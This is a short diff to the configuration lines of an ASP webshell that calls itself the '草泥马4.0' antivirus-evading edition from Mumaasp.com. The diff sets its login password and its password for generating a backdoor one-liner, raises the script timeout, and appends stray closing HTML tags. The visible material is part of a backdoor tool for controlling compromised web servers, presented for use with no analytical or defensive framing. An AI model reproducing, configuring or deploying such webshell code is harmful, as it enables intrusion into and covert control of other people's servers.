@@ -3,8 +3,8 @@
 
 
 Server.ScriptTimeout=999999999
-UserPass	="admin"'      	  		 	密码
-clientPassword	="admin"'				生成后门一句话密码
+UserPass	="1"'      	  		 	密码
+clientPassword	="mumaasp.com"'				生成后门一句话密码
 mNametitle	="传说中的草泥马4.0   Mumaasp.com发布免杀版"'  	 			
 Copyright	="传说中的草泥马4.0   Mumaasp.com发布免杀版"'				版权		
 bs=False
@@ -29,4 +29,13 @@ strBAD=strBAD&"</script>"
 
 
 
-
+</body></html></body></html>
+</body></html>
+</body></html>
+
+
+
+
+
+
+
